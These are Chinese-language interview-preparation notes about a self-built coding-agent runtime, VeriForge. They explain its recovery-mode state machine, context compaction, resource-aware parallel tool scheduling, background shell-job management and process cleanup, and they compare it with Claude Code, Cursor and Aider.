`RecoveryStrategyMiddleware` 是 `LoopDetectionMiddleware` 的互补层。LoopDetection 负责"检测 + 警告"（注入提示消息让 LLM 自己反思），Recovery 负责"限制 + 引导"（通过 `before_tool` 阻断特定工具调用，强制 Agent 走特定恢复路径）。

状态机有 5 个核心模式，每个模式限制不同的工具集：

```
NORMAL ──[环境错误 ≥2 次]──→ ENV_FIX
       ──[任意错误 ≥2 次]──→ SPEC_RECHECK ──[同文件再编辑 ≥2 次]──→ RETHINK
                                                                    ↓ replan
                                                                  PROBE
                                                                    ↓
                                                              FINAL_VERIFY
```

| 模式 | 触发条件 | 工具限制 | 退出条件 |
|---|---|---|---|
| `NORMAL` | 默认 | 无限制 | — |
| `ENV_FIX` | 连续 ≥2 次环境错误（`command not found`、`permission denied`、`no module named` 等） | 禁止文件修改和 `spawn_agent`，只允许诊断和安装命令 | 成功执行一个非只读 shell 命令 |
| `SPEC_RECHECK` | 连续 ≥2 次相同错误签名 | **强制只读**：禁止 `write_file`，`run_bash` 只允许只读/验证命令 | 执行 `update_plan_state` 后清除 |
| `RETHINK` | 在 `SPEC_RECHECK` 中仍然尝试编辑同一文件 ≥2 次 | 必须先 `update_plan_state` 才能执行任何 action 工具 | 执行 `update_plan_state` 后清除 |
| `PROBE` | required replan 成功提交后 | 只允许一个低成本只读 probe，例如 read/search 或验证命令 | probe 成功后恢复正常执行 |
| `FINAL_VERIFY` | 手动设置 | 禁止 `spawn_agent`、`web_search`、`web_fetch` | — |

关键设计：`_register_failure()` 用错误签名（`result` 字符串）做重复判断。如果连续两次错误的签名相同（比如同一个 `ModuleNotFoundError`），才升级模式；不同类型的错误重置计数器。这避免了"第一次 import error、第二次 syntax error"被误判为重复失败。required replan 的关键点也不在 prompt，而在运行时：`TaskTrackingEnforcementMiddleware` 会阻止继续漂移，`update_plan_state` 会把旧的 `start` 归一化成 `replan`，并把 recovery mode 切进 `PROBE`。

### 用户补充信息怎么追加到同一个任务

这里的原则是：**不改写历史 prompt，而是追加一个新的用户 turn**。在 TUI 里，即使当前 turn 仍在运行，输入框也保持可用；用户可以继续输入“补充一下，刚才那个功能还要兼容 Windows”。`VeriForgeApp._submit_async()` 会先把消息标记为 queued，当前 turn 完成后再按顺序提交给 `InteractiveSession`。前面的工具结果、计划状态、runtime state、event log 都还在，所以补充不会插进正在执行的 tool batch，也不会丢失。

`Ctrl-C` 只取消当前活动 turn，不会清空已经排队的后续输入；Slash command 在有活动 turn 时也进入同一队列。这比尝试在一个 LLM/tool turn 中途热插入消息更可预测。

如果当前任务已经到了 plan handoff，也有专门路径：`plan` profile 生成计划后，用户如果不是回复"继续"，而是输入修改意见，`revise_pending_plan()` 会把这段反馈作为计划修订请求追加进去；用户确认后再 handoff 到 `coding-agent`。

如果 agent 自己发现信息不够，它可以用 `ask_user` 工具问一个结构化问题。这个工具是控制屏障，不会和其他工具并发；用户回答会作为 tool result 回到同一轮对话里，agent 不需要猜。

### 为什么这样设计

我不希望系统在遇到重复工具调用时直接粗暴 kill，因为有时候重复是合理的，比如第一次命令失败、第二次修环境后再跑一次。所以设计上是分级的：先提醒、再限制操作、最后 fallback 停止。用户补充信息也是同理，不重启、不覆盖，而是追加到同一条会话链路里，保证可追溯。

LoopDetection 和 Recovery 的互补关系可以用一句话总结：**LoopDetection 是"软打断"（注入警告，依赖 LLM 自己调整），Recovery 是"硬限制"（阻断工具调用，强制走恢复路径）。前者适用于 Agent 还没意识到在循环，后者适用于已经确认在循环但 Agent 忽略了警告。**

面试里我会总结成一句话：**重复工具调用靠 runtime 识别"无进展"，补充信息靠 append-only 的 conversation 语义。一个负责防止 agent 空转，一个负责让用户自然地把任务说完整。**

---

## Q: 你支持多个 profile（coding-agent / plan / terminal 等），这些 profile 之间的切换会丢失上下文吗？

> Profile 切换不会拆分会话。现在的设计是 **一个 session 共享一个 conversation**，每个 profile 只维护自己的 Agent、tools schema 和 middleware 配置；切换时替换运行时并保留完整消息历史，不追加 handoff 消息。

### TUI 层的 profile 切换

`InteractiveSession.switch_profile()` 在 TUI 的底部 profile 选择面板中调用时，会：

1. 创建或重建目标 profile 的 Agent 运行时
2. 把同一个 `AgentConversation` 重新绑定到新的 system prompt、tools schema 和 middleware 配置
3. 保留已有消息、task board、观察和压缩状态

从 `plan` 切到 `coding-agent` 时，已确认的方案只作为当前执行 turn 的任务内容传入，不额外制造一轮对话或模型调用。

### Agent 循环内部

`AgentConversation` 负责连续上下文；profile 运行时负责当前轮的 system prompt、工具权限和中间件。切换只发生在 turn 边界，不在一次模型调用中途改写。

### 会话持久化

每个 session 的事件（tool_call、file_change、approval、profile_switched、profile_route_decision 等）以 JSONL 格式写入 `.harness/sessions/` 目录。历史会话通过 TUI 右上角时钟图标选择；`/fork` 从当前会话创建并进入分支。

---

## Q: 如果让你重写这个项目，你会改什么？

> 三件事：**LLM 抽象层**、**更彻底的 async runtime**、**插件化工具系统**。

### 1. LLM 抽象层

当前 `providers.py` 直接依赖 `openai` SDK。如果重写，我会定义一个 `LLMClient` Protocol：

```python
class LLMClient(Protocol):
    def chat(self, messages, tools, **kwargs) -> LLMResponse: ...
    def chat_stream(self, messages, tools, **kwargs) -> Iterator[LLMChunk]: ...
```

然后 `OpenAIClient`、`AnthropicClient` 分别实现。这样切换 LLM provider 只需要换一个 client 实现，不用改 `providers.py` 的方法签名。

### 2. 更彻底的 async runtime

现在已经有 `ToolExecutor` 线程池、资源感知并发、长运行 shell job 后台化，但主循环和中间件语义本质上还是同步的。如果重写，我会更早把 runtime 做成 async-first：

- 工具、MCP、浏览器、shell job 都有统一的 async 调度接口
- cancellation token 和 progress event 变成工具协议的一部分
- TUI 可以在等待工具时持续显示进度，而不是只等最终 tool result

但这需要重构整个中间件链（`before_tool`/`post_tool` 的同步语义）、事件回写顺序和测试方式，工作量很大。

### 3. 插件化工具系统

当前内置工具在 `runtime/builtins/registry.py` 中注册（`BUILTIN_TOOL_REGISTRY`），`runtime/tools.py` 只是兼容 re-export。如果要支持用户自定义工具，需要一个插件机制：

- 工具定义文件（JSON/YAML schema + Python handler）
- 自动发现（扫描 `.harness/tools/` 目录）
- 权限分类（用户声明工具的风险级别）

当前的 skill 系统（`skills/`）是第一步，但只提供了 system prompt 注入，没有真正的工具注册。

---

## Q: 如果只有一周，你会砍掉哪些功能？

> 砍到只剩 **Agent 循环 + 工具执行 + CLI 入口**。具体砍掉：

### 必须保留（MVP 核心）

- Agent 循环（`loop.py`）— 核心 while 循环
- 工具系统（`runtime/tool_registry.py`、`runtime/tool_runner.py`、`runtime/builtins/`）— `read_file`、`write_file`、`run_bash`
- LLM 调用（`providers.py`）— OpenAI chat completions
- CLI 入口（`cli.py`）— `veriforge -p "task"` 批处理模式
- 基础权限（`permissions.py`）— 至少 read-only 和 workspace-write

### 立即砍掉

- **TUI** — 用批处理模式（`-p`）就够了，不需要交互式界面
- **Profile 系统** — 只保留 coding-agent 一个 profile
- **中间件** — 全部砍掉，循环检测和时间预算可以在 prompt 里用文字约束
- **上下文压缩** — 用简单的截断替代 LLM 摘要
- **Session 持久化** — 不需要 resume/fork
- **Delegated agents** — MVP 可以先砍掉并行只读委派和隔离 Patch proposal
- **Skill 系统** — 不需要渐进披露
- **Browser test** — 砍掉 Playwright 依赖

### 一周能做到的版本

一个 500 行的 Python 脚本：读文件 → 写文件 → 跑命令 → 调 LLM。用 `-p` 模式单次执行，没有交互。这已经能覆盖 80% 的 coding agent 使用场景。

---

## Q: 这个项目和 Claude Code / Cursor / Aider 相比，差异化在哪？

> 核心差异：**runtime 控制力**。Claude Code 和 Cursor 是产品，这个项目是一个可定制的 runtime。

### 与 Claude Code 对比

| 维度 | Claude Code | 本项目 |
|------|-------------|--------|
| 模型 | 只支持 Claude | 任何 OpenAI 兼容 API |
| 权限 | 简单的允许/拒绝 | `workspace-write` / `llm-auto` / `danger-full-access` 三档 runtime 权限 + profile 只读约束 + 命令风险分类 |
| 中间件 | 无 | 多个可组合中间件（循环检测、错误恢复、任务追踪、验收审查、时间预算等） |
| Profile | 单一模式 | 产品可见 5 个 profile；`terminal` 作为评测专用 profile 保留显式入口 |
| 自定义 | 配置文件 | 可以写新 profile、新中间件、新工具 |

### 与 Cursor 对比

Cursor 是 IDE 插件，核心体验是 inline 补全和 chat 侧边栏。本项目是 CLI 工具，核心体验是终端中的 agent 循环。Cursor 不暴露 agent 的内部状态，用户看不到工具调用、中间件决策、上下文压缩。本项目的 TUI 把所有这些都展示给用户。

### 与 Aider 对比

Aider 的核心是"编辑 chat"模式 — 用户和 agent 通过 git diff 对话。本项目更像一个完整的 runtime：有 shell 会话持久化、有任务追踪、有恢复策略状态机、有 plan-then-execute 工作流。Aider 的中间件能力很弱，没有循环检测、错误恢复这些。

### 总结定位

- **Claude Code** = 产品（开箱即用，不可定制）
- **Cursor** = IDE 插件（inline 体验，不透明）
- **Aider** = 编辑工具（git diff 驱动，轻量）
- **本项目** = Runtime（可定制、可扩展、透明）

---

## Q: 怎么体现出 Harness 的？

> "Harness" 的含义是"驾驭" — 通过 runtime 控制层驾驭 LLM 的行为，而不是让 LLM 自由发挥。

### 体现"Harness"的设计

1. **中间件链** — 多个中间件在运行时控制 agent 行为：循环检测防止原地打转，错误恢复引导正确方向，任务追踪维护验收项，时间预算控制节奏，退出验证确保质量。
2. **权限沙箱** — 三档 runtime 权限 + profile 只读约束 + 命令风险分类 + 人工或 LLM 自动审批流，防止 agent 执行危险操作。
3. **Profile 系统** — 不同任务用不同的运行契约：plan profile 只允许读，terminal profile 面向非交互评测，coding-agent profile 有完整的中间件保护。
4. **上下文管理** — 85% auto-compaction + 结构化工作摘要 + SessionJournal，防止 agent 在上下文接近上限时反复压缩，并保留可恢复的原始历史。
5. **Observation Store** — 文件变更时自动失效旧的观察结果，防止 agent 基于过时信息做决策。

### 命名来源

参考了 GitHub Copilot 的 "Harness" 概念 — 一个控制 AI 行为的 runtime 框架。不是直接调用 LLM，而是通过一个结构化的控制层来约束、引导、保护 LLM 的行为。

---

## Q: 从 Execution / Tooling / Context / Lifecycle / Observability / Verification / Governance 七个维度，分析这个 Harness 是怎么设计的？

> 我会先用一句话概括：这个项目里的 Harness，不是一个外壳，而是一层运行时控制系统。它解决的问题是：LLM 可以负责思考和生成，但文件、命令、上下文、验证、权限这些关键边界，必须由 runtime 接管。

### 按 STAR 讲

**S（背景）**：做 coding agent 最大的问题不是"能不能调模型"，而是模型真的开始改代码、跑命令以后，风险一下子变多：它可能乱跑 shell、基于旧文件内容继续写、上下文快满时忘掉目标、最后还会自信地说"完成了"。

**T（任务）**：所以我给自己的目标不是写一个 chat wrapper，而是设计一个可以驾驭模型的 runtime。这个 runtime 要做到三件事：让 agent 能干活、让危险操作可控、让结果能被验证和追溯。

**A（行动）**：我把 Harness 拆成七层：

| 层面 | 我在控制什么 | 项目里的落点 |
| --- | --- | --- |
| Execution | 命令在哪跑、怎么停、会不会卡死 | host / docker sandbox、`PersistentShellSession`、后台 `ShellJobManager` |
| Tooling | 模型能调用什么工具、工具能不能并发 | `ToolRegistry` 的 `schema / permission / effect / disclosure`，`ExecutionPlanner` 资源调度 |
| Context | 模型依据的信息是不是最新、上下文满了怎么办 | 85% auto-compaction、结构化摘要、SessionJournal、Observation Store |
| Lifecycle | agent 怎么从任务开始走到退出 | bounded loop、中间件钩子、plan → coding-agent handoff、只读子 agent |
| Observability | 出问题后能不能复盘 | `.harness/sessions`、`events.jsonl`、TraceWriter、observability metrics |
| Verification | 不相信模型说"完成了" | `PreExitVerificationMiddleware`、`StaticVerifierMiddleware`、profile acceptance criteria |
| Governance | 哪些操作要批准、哪些永远不能做 | `PermissionPolicy`、审批面板、命令风险分类、allowlist、预算上限 |

### 我会重点举两个例子

第一个是 **Tooling + Governance**。工具通过 registry 声明权限与资源 effect。权限决定允许、审批或拒绝；effect 决定并发、排序和隔离。真正执行前还会经过 `PermissionMiddleware`。

第二个是 **Context + Verification**。模型读过一个文件以后，如果后面又修改了这个文件，Observation Store 会把之前那条观察标记为 stale，并注入 `FACT INVALIDATION`，提醒它不要基于旧内容继续写。最后退出时也不信它的自我判断，`PreExitVerificationMiddleware` 会重新注入原始需求，让它按需求跑验证；Python 文件还会过 `ast.parse` 和 `ruff check --diff`。

### R（结果）

这样设计以后，agent 不是"自由发挥"，而是在一个可控轨道里工作：它可以读代码、改文件、跑测试、开服务，但每一步都有边界。危险命令会被拦，长运行服务不会卡死，旧上下文会失效，退出前必须验证，事后还能从 event log 复盘整条链路。

面试里我会强调这个取舍：**Harness 的价值不是让 LLM 更聪明，而是让 LLM 的错误更难悄悄落地。**

---

## Q: 讲一下你的完整 runtime 设计吧

> Runtime 分四层：**Agent 循环** → **工具系统** → **中间件链** → **交互层**。

### 第一层：Agent 循环（`agent/conversation.py`）

`AgentConversation.run_until_idle()` 是核心。一个 bounded for 循环（最多 60 次迭代），每次迭代：

1. 取消检查
2. 中间件 `per_iteration` 钩子
3. 上下文生命周期检查（token 计数 → 压缩/重置决策）
4. LLM 调用（chat completions + function calling）
5. `ToolExecutor` 按资源依赖执行工具（无冲突调用可并发）
6. 中间件 `pre_exit` 钩子（决定是否继续）

循环退出条件：无工具调用、finish_reason="stop"、迭代上限、API 错误过多、用户取消。

### 第二层：工具系统（`runtime/tool_registry.py`、`runtime/tool_runner.py`、`runtime/builtins/`）

`ToolRegistry` 管理工具注册表，每个工具有 schema、handler、permission 和 effect resolver；还可以标记 deferred disclosure。`execute_tool()` 统一路由：查找 → 预验证（自动修正路径、阻止交互命令）→ 执行 → 结果包装。

工具执行时注入 `runtime_state`（shell 会话、任务板、观察存储）和 `tool_context`（workspace 服务、checkpoint 回调）。

### 第三层：中间件链（`runtime/middleware/`，兼容入口 `runtime/middlewares.py`）

`AgentMiddleware` 基类包含 turn、工具执行前后、迭代和退出钩子。中间件按 list 顺序执行：`before_tool` / `pre_exit` 是 first-wins，`post_tool` / `per_iteration` 会执行全部；工具获准后还会调用 `on_tool_allowed`。

内置中间件覆盖：循环检测、错误指导、任务追踪、验收审查、恢复策略、退出验证、时间预算，以及 terminal profile 专用 shell 写入策略。

### 第四层：交互层（`frontend/opentui/` + `tui_bridge.py` + `core/interactive.py`）

`InteractiveSession` 是运行时编排中心：从 profile 构建 Agent 运行时、管理共享 AgentConversation、ToolContext、事件总线、会话持久化、Mention 解析、checkpoint、turn 级路由和计划执行。

OpenTUI 前端负责 transcript、composer、命令/文件补全、状态栏和各种 panel；`OpenTuiBridge` 把前端的 NDJSON request 映射到 Python session，并把 session event 转成 UI event。Python 仍是 profile、权限、会话和工具执行的唯一事实源。

### 数据流

```
用户输入 → OpenTUI Composer
         → NDJSON submit → OpenTuiBridge task queue
                           → slash command → session.handle_slash_command() → panel / notice event
                           → 普通文本 → session.submit()
                                        → AgentConversation.run_until_idle()
                                           → LLM call → tool calls → middleware hooks
                                        → stream / session events → NDJSON UiEvent
         ← React reducer / components 渲染 transcript、panel、interaction 和状态栏
```

---

## Q: 你觉得这个项目最大的挑战是什么？怎么解决的？

> 最大的挑战是 **上下文窗口管理** — 在有限的 token 预算内让 agent 保持长期一致性。

### 为什么难

系统默认按 200K tokens 估算上下文窗口，实际上限仍由 provider 和模型决定。Coding agent 的任务可能涉及读多个文件、执行多个命令、生成大量代码，一个复杂任务很容易逼近上限。

用完后的选择都很痛苦：

- 截断：丢失历史信息，agent 会重复已经做过的工作
- 摘要：LLM 摘要本身消耗 token，且可能遗漏关键细节
- 重置：丢失所有上下文，agent 必须从零开始理解项目

### 解决方案：85% 结构化压缩 + append-only 手账

1. **单触发阈值**：85% 以下不自动压缩，85% 以上才介入。
2. **摘要旧历史**：摘要当前 turn 之前的旧 conversation，不压缩当前 turn。
3. **Thrash 保护**：同一 turn 最多自动压缩一次，summary 后仍超过 85% 就暂停本 turn 的 auto-compaction。
4. **可恢复边界**：压缩成功后才向 SessionJournal 写边界；恢复和 fork 使用最近摘要与边界后的原始消息，不依赖临时 reset 文档。

### 效果

这个设计让模型上下文保持紧凑，同时保留完整审计来源。`/context` 会分别展示系统指令、近期消息、工作摘要、长期记忆和工具定义的预算，便于解释一次压缩到底省在哪里。

---

## Q: 做这个项目最让你印象深刻，或者说最困难的地方是什么？

> 最困难也最让我印象深刻的是**工具执行系统的异步化改造**——把一个原本 150 行内联在 Agent 循环里的串行工具执行，拆成一个支持保守并行、长运行任务后台化、跨平台进程管理的独立执行引擎。这过程中涉及的线程调度、进程生命周期管理、跨平台兼容，都是我以前没深入碰过的领域。

### 起点：一个"能用但不够好"的串行循环

最初的工具执行逻辑很简单，就写在 `AgentConversation.run_until_idle()` 里，大概是这样：

```text
for each tool_call:
    解析 JSON → 检查权限 → 执行工具 → 追加结果 → 下一个
```

150 行代码，逻辑直观，但问题也很明显：

- Agent 一次返回三个 tool call——`read_file A`、`run_bash pytest`、`read_file B`——它们完全独立，却没有并行执行，用户白等。
- `npm run dev` 这种 dev server 命令一跑就卡住，直到超时。Agent 只能靠 prompt 提示"请用后台命令"，但不能真正管理后台进程。
- 所有逻辑揉在一个方法里，新增一个工具执行策略就要动主循环，改动风险高、测试困难。

### 第一步：把工具执行从 Agent 循环中抽出来

第一个决定是**不直接在循环里重构**，而是先把整块逻辑提取成独立的 `ToolExecutor` 类。这一步的价值在工程上：主循环从 ~200 行缩到 4 行（`ToolExecutor(...).execute(tool_calls)`），所有执行策略都隔离在一个文件里，可以独立测试和演进。

但提取只是换位置，真正的难点在后面。

### 第二步：用资源声明判断并行，而不是给工具贴固定车道

工具并行最大的坑不是怎么写线程池，而是**怎么表达两个调用是否竞争同一资源**。固定 lane 会把所有写操作一刀切串行，而且内置工具、MCP、Shell 容易各自长出一套调度逻辑。

现在 registry 为每个工具注册 effect resolver，解析成 `CallEffect`：

- `ResourceClaim(domain, key, scope, access)` 表达精确文件、目录子树或全局资源的读写；
- `barrier` 表达审批、交互、计划控制和未知副作用等不可越过的顺序点；
- `concurrency_key` 只做 network、subagent 等容量限制，不参与权限判断；
- 未声明 effect 的工具默认全局独占，缺少信息不会被乐观并行。

`ExecutionPlanner` 按模型原始顺序建立冲突边：资源范围重叠且至少一方写入时，后一个依赖前一个；控制屏障依赖全部前序调用，并阻止全部后序调用越过。这样 `write_file(a)` 和 `write_file(b)` 可以同 wave 执行，但同文件读写、目录读取与目录内文件写会严格串行。一个与 `a` 无关的网络读取也可以越过针对 `a` 的等待，不再受邻接分组限制。

同一 assistant response 中的调用被视为数据独立；如果后一个调用需要前一个的输出，模型应在下一轮再发起。调度只约束资源顺序，不把前一个调用的成功当作后一个的隐式前置条件。

### 第三步：Shell 命令的分类——不能用简单规则

Shell 命令的分类是整个设计中最棘手的部分。一个命令字符串 `"npm run dev"` 和 `"npm run test"` 只差一个单词，但前者是长运行 dev server，后者是短命令。

我设计了三层分类逻辑（都在 `shell_classification.py` 中）：

1. **先排除明显不是长运行的**——`npm test`、`pytest`、`pip install`、`git` 命令、`black` 格式化——这些绝不应该后台化。
2. **检查状态与副作用**——`export`、`source`、`conda activate`、`cd`、未知脚本和普通修改取得工作区全局写声明；每次 `run_bash` 都是新 Shell，因此相关状态必须写进同一条命令。
3. **白名单匹配长运行命令**——`npm run dev`、`pnpm dev`、`vite`、`next dev`、`uvicorn`、`python manage.py runserver`、`flask run` 等约 20 种模式。

最微妙的一个判断是：**`cd web && npm run dev` 应该识别为长运行**。这意味着需要解析 `cd <dir> && <cmd>` 结构，递归判定内层命令。但如果用户在 `npm run dev` 前面加了 `export FOO=bar`，就不能后台化——因为 export 改变了 shell 状态，而这个状态后续命令可能依赖。

这个分类器宁可漏判（把长命令当短命令执行），也不能误判（把测试/安装/格式化后台化）。漏判的代价是超时，误判的代价是命令执行不完整、状态不一致。

### 第四步：长运行命令不能阻塞——但"不阻塞"意味着什么？

这是整个设计中最核心的架构决策。当识别出 `npm run dev` 是长运行命令时，系统不能直接 `subprocess.run()` 然后等 300 秒超时。必须让命令"在后台跑"，同时让 Agent 能：

- 检查它是不是成功启动了（日志里有没有 "ready" 或 "listening on port XXXX"）
- 读取它的实时输出
- 在不需要时干净地停掉它和它的所有子进程

我设计了 `ShellJobManager` 来管理这个生命周期：

```text
run_bash("npm run dev")
    │
    ├─ 识别为 long_running
    ├─ ShellJobManager.start()
    │   ├─ subprocess.Popen(..., stdout=PIPE, stderr=PIPE)
    │   ├─ daemon reader threads → RingBuffer（线程安全环形缓冲区，保留最近 1MB 日志）
    │   ├─ daemon monitor thread → 等进程结束，记录 exit_code
    │   └─ early_exit_seconds=0.5s：0.5 秒内快速退出说明启动失败
    │
    └─ 返回 ToolResult: "Started background shell job shell-job-abc123. Use read_shell_output..."

list_shell_jobs()    → 列出所有 job 及其状态
read_shell_output()  → 读取 RingBuffer 最近 N 字符
stop_shell_job()     → 杀进程树 + 标记 stopped
```

Agent 拿到 `job_id` 后，后续操作完全通过这三个工具完成。`run_bash` 的返回几乎瞬间完成，Agent 不会卡住。

### 第五步：进程树管理——Windows、Linux、Docker，三种完全不同的路径

这部分是我之前完全没有经验的领域——跨平台进程管理。

**Linux (POSIX)**：

- `preexec_fn=os.setsid` 创建独立进程组，保证 Ctrl+C 不会意外波及。
- 停进程树用 `psutil.Process(pid).children(recursive=True)` 递归找子进程。
- 先 `terminate()`（SIGTERM），等几秒，活着的 `kill()`（SIGKILL）。
- Fallback：如果 psutil 路径出问题，用 `os.killpg()` 杀整个进程组。

**Windows**：

- `CREATE_NEW_PROCESS_GROUP` 创建独立进程组。
- PowerShell 命令要包一层：`& { <command> }; if ($LASTEXITCODE ...) { exit ... }`，否则 native command 的退出码不会传递给外层进程。
- 停进程树主路径仍然是 `psutil`（Windows 上也支持 `children(recursive=True)`）。
- Fallback：`taskkill /PID <pid> /T /F` 杀整个进程树。

**Docker sandbox**：

- 每个 long-running job 使用**独立容器**——`docker run --rm --name hca-job-<id>`。
- 不复用前台 shell 的 sandbox 容器——因为一个 job 的停止不应该影响其他 job。
- 日志通过 `subprocess.PIPE` 收集，不依赖 Docker 日志驱动。
- 停止用 `docker rm -f <container>`。

三种路径的接口是统一的：

```python
def start(self, command: str) -> ShellJob:
    # 内部根据 platform + sandbox_mode 分发到
    # _start_posix_process / _start_windows_process / _start_docker_process
```

### 第六步：并发上限——不能让并发变成"大家一起死"

并行不是越多越好。如果 Agent 一次返回 20 个 tool call，全扔进线程池可能：

- 打满 CPU，影响 Agent 循环的响应
- 耗尽文件句柄
- 触发 API rate limit

我用两层限流：

- **全局 `ThreadPoolExecutor(max_workers=8)`**——总并发上限。
- **按 `concurrency_key` 共享的 `Semaphore`**——subagent 最多 3 个，network read 最多 2 个；它只控制容量，不承担安全分类。

### 第七步：但多线程带来了新问题——事件顺序

在串行模式下，事件（tool_call、tool_result、file_change）按执行顺序自然生成，时间线一致。但在并行模式下，如果我让 worker 线程直接写 conversation 和发事件，就会出现乱序。

我的解决方案是把执行分成两阶段：

```text
Worker 线程（并行）          主线程（串行、按原始 index）
─────────────────────      ─────────────────────────────
执行工具                    1. 检查 budget / before_tool
返回原始 ToolResult         2. 发 tool_call event
不写 conversation           3. emit observation
不产生 observation          4. 追加 tool message
不调用 post_tool            5. 执行 fact invalidation
                            6. 调用 post_tool middleware
```

`_record_executed_result()` 是唯一的"回写点"，它在主线程中按原始 index 排序后逐条处理。Worker 干的越快越好，但写入顺序由主线程保证。

这个设计还有一个隐藏收益：**审批时机正确**。planner 会先执行 ready 集合中的独立安全项，待 risky 调用真正 ready 后才进入 `PermissionMiddleware` 并发出审批；拒绝只阻止该调用，取消或 fallback 才停止尚未启动的调用。

### 收获：这件事教会了我什么

1. **并发不是"加线程"就能解决的问题**。最难的是把副作用转换成可比较的资源声明，并把权限、容量限制和资源冲突分开。

2. **未知信息必须保守降级**。未声明 effect、未知 Shell 和控制工具默认全局独占；只有能够声明到精确文件的结构化写才获得更细并发。

3. **跨平台进程管理没有银弹**。`psutil` 在 POSIX 上表现很好，Windows 上也能用，但 fallback 到 `taskkill` / `os.killpg` 是必要的。Docker 路径又是完全不同的逻辑。三者统一在同一个接口下，每一条路径都有自己的边界情况。

4. **长运行任务的本质不是"超时设大一点"**。把 `npm run dev` 从阻塞命令变成后台 job，引入了一整套新的资源管理模型（job ID、RingBuffer、daemon threads、进程树、跨平台停止）。但这是值得的——Agent 不再被 dev server 卡住，能检查启动状态、读取日志、干净停止。这比单纯调大 timeout 参数在体验上提升了一个量级。

5. **提取比内联重构更安全**。`ToolExecutor` 不是直接在循环里改出来的，而是先把整个代码块原样提取，再做内部重构。这样做的好处是：主循环的变化只有 4 行（调用 `ToolExecutor`），一旦执行器有问题可以快速回退，不影响主循环的稳定性。

---

## Q: 你的工具和子代理并行是如何实现的？

> 我做的不是"把所有工具调用都丢进线程池"，而是**统一资源感知调度**。主 Agent 的决策循环仍然串行，但同一轮返回的内置工具、MCP 和 Shell 调用会先解析资源声明，再按冲突图组成 execution wave。

### 用 STAR 讲

**S（背景）**：一开始工具调用是全串行的。模型一次返回多个互不依赖的读取或 Agent 任务时，串行执行会增加等待；共享资源写入又不能随意并发。

**T（任务）**：所以我要解决的是两个目标的平衡：能并发的地方加速，不能并发的地方保持确定性。尤其是子代理，它可以并发调研，但不能变成多个 Agent 同时写代码。

**A（行动）**：

第一步是把权限和调度分开。`PermissionPolicy` 只决定 allow / ask / deny；`ToolRegistry` 的 effect resolver 决定资源、屏障和容量 key。未声明 effect 的扩展工具默认全局独占。

第二步是建依赖图。`read_file` 声明精确文件读，`write_file` / `apply_patch` 声明精确文件写，`list_files` / `repo_search` 声明目录子树读。重叠资源且至少一方写入时按原始顺序建边；控制工具、未知副作用和全局 Shell 写是严格屏障。不同文件写入、网络读取和无关本地操作因此可以共享 wave。

第三步是真正执行。ready wave 进入 `ThreadPoolExecutor(max_workers=8)`；network 和 subagent 使用共享 `concurrency_key` 限流。session-scoped `ResourceCoordinator` 原子申请排序后的多资源读写锁，防止多个 executor 或嵌套调用绕过 planner 形成竞态。

第四步是结果回写。worker 线程只返回 `ToolResult`；主线程使用 index buffer，只有从当前最小未回写 index 开始连续就绪时才写入消息、事件、Observation Store 和 middleware。即使后面的独立调用先完成，transcript 仍保持模型原始顺序。

### 子代理为什么可以并行

每次 `spawn_agent` 只启动一个 Agent；同一轮发出多个调用即可并行。全局 limiter 控制总量，路径 ownership 阻止 worker 领取重叠范围。

只读角色共享主工作区。worker 写隔离副本，完成后保存完整提案。主 Agent 审查并三方合并，冲突文件不会写入主工作区。

**R（结果）**：这个设计带来的好处是，读类工具、搜索、子代理调研可以明显减少等待时间；但写文件、审批、状态更新、最终验证仍然保持单一顺序。面试里我会总结成一句话：**并发的难点不是开线程，而是定义清楚哪些东西永远不能并发。**

---

## Q: 你觉得这个项目最有创新性的地方是什么？为什么？

> **Observation Store 的 Fact Invalidation 机制** — 当文件变更时，自动失效之前对这些文件的观察结果。

### 问题

所有 coding agent 都有一个共同问题：agent 读了一个文件的内容，后来修改了这个文件，但上下文中还保留着旧的文件内容。如果 agent 后续基于旧内容做决策，就会出错。

### 解决方案

`FactTracker` 跟踪每个工具调用产生的观察结果。当 `write_file` 或 `apply_patch` 修改文件时，`ObservationStore` 自动找到所有引用该文件的观察，把长观察压缩为 `[OBS ... stale]` 标记，并注入一条 `FACT INVALIDATION` 通知告诉 agent："你之前读的这个文件内容已经过时了，需要重新读取。"

### 为什么有创新性

Claude Code、Cursor、Aider 都没有这个机制。它们依赖 LLM 自己意识到"文件被修改了，我应该重新读取"。但 LLM 不总是能做到这一点，特别是在长对话中。Fact Invalidation 是一个 runtime 级别的保障，不依赖 LLM 的判断力。

---

## Q: 哪些地方参考了 Claude Code 和 OpenAI Codex？哪些地方做了改进？为什么？

> 我会这样回答：这个项目确实参考了 Claude Code 和 Codex，但参考的不是"代码照搬"，而是两个层面的设计经验。Claude Code 更偏产品体验，Codex 更偏执行安全；我做 VeriForge 的时候，是把这两件事拆开吸收，再按自己的 runtime 目标重新组合。

### 用 STAR 讲

**S（背景）**：当时我想做的不是一个普通 chatbot，而是一个本地 coding agent。它既要像 Claude Code 一样在终端里顺手，又要像 Codex 那样有清楚的执行边界，不能让模型直接在用户机器上自由发挥。

**T（任务）**：所以我需要回答两个问题：第一，开发者怎么和它自然互动；第二，模型真正执行文件和命令时，runtime 怎么兜住风险。

**A（行动）**：

从 **Claude Code** 这边，我主要参考了交互体验：

- **CLI 双入口**：`veriforge` 进入 TUI，`veriforge -p "task"` 做批处理。前者适合开发时边看边调整，后者适合 benchmark 或脚本化执行。
- **工作流入口**：`/checkpoint`、`/mcp`、`/compact`、`/fork`、`/observe` 只保留改变当前工作流的动作；profile 通过底部选择面板切换；历史会话通过右上角时钟图标选择，查询信息交给自然语言或非交互 CLI。
- **项目规则文件**：Claude Code 有 `CLAUDE.md` 这种 repo 约定，Codex 生态也有 `AGENTS.md`。我在 VeriForge 里做成 `HARNESS.md`，由 `PromptPrefixBuilder` 放进稳定 system prefix，让项目规则变成 agent 的稳定上下文。
- **工具权限心智**：Claude Code 的 read / edit / shell 分类给了我启发，但我把权限和调度拆开：`permission` 决定允许、审批或拒绝，effect resolver 决定资源冲突和容量限制。

从 **Codex** 这边，我主要参考了执行边界：

- **Shell marker 协议**：`workspace/shell_session.py` 里还能看到 `__CODEX_STDOUT_*`、`__CODEX_STDERR_*`、`__CODEX_EXIT_*`。这个设计很朴素但很重要：不要靠猜终端输出，而是明确切分 stdout、stderr 和 exit code。
- **Sandbox 心智**：VeriForge 支持 `HARNESS_SANDBOX_MODE=host|docker`。host 适合本地开发，docker 适合隔离不可信命令，默认还能关网络、加 `no-new-privileges`。
